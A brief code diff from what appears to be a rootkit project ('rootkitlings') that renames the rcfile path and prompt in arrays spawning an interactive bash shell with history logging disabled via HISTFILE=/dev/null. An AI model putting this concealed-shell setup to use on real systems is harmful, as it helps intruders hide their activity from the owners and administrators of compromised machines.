@@ -25,7 +25,7 @@ static char *rk_shell_argv[] = {
 	"/bin/script",
 	"-q",
 	"-c",
-	"/bin/bash --noprofile --rcfile /etc/rootkitlings.bashrc -i",
+	"/bin/bash --noprofile --rcfile /etc/rklings.bashrc -i",
 	"/dev/null",
 	NULL,
 };
@@ -35,7 +35,7 @@ static char *rk_shell_envp[] = {
 	"PATH=/bin",
 	"TERM=xterm-256color",
 	"HISTFILE=/dev/null",
-	"PS1=(rootkitlings) \\w # ",
+	"PS1=(rklings) \\w # ",
 	NULL,
 };
 
